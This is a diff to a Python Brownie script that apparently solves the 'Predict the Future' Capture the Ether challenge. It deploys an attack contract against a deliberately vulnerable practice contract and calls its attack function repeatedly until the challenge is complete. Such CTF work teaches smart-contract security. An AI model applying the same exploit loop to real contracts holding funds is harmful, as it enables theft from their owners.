@@ -10,7 +10,7 @@ from brownie import (
 )
 from scripts.helpful_scripts import (
     get_account,
-    get_contract_address,
+    get_challenge_contract,
     check_solution,
     get_web3
 )
@@ -18,13 +18,16 @@ from web3 import Web3
 
 
 def main():
-    player = get_account()
-    challenge_contract = PredictTheFutureChallenge.deploy({"from": player, "value": Web3.toWei(1, "ether")})
+    player = get_account("player")
+    challenge_contract = get_challenge_contract(
+        PredictTheFutureChallenge, "predict_the_future", [], {"from": player, "value": Web3.toWei(1, "ether")}
+    )
     attack_contract = PredictTheFutureAttack.deploy(challenge_contract, {"from": player})
+    # attack_contract = PredictTheFutureAttack.at("0x5eC7FdE351AE65540872f26f6EC570Cf4FAb5E4c")
 
     attack_contract.lockInGuess(0, {"from": player, "value": Web3.toWei(1, "ether")})
-    while not interface.IChallenge(challenge_contract.address).isComplete():
-        tx = attack_contract.attack({"from": player})
+    while not challenge_contract.isComplete():
+        tx = attack_contract.attack({"from": player, "allow_revert": True, "gas_limit": 300_000})
         tx.wait(1)
 
     check_solution(challenge_contract.address)
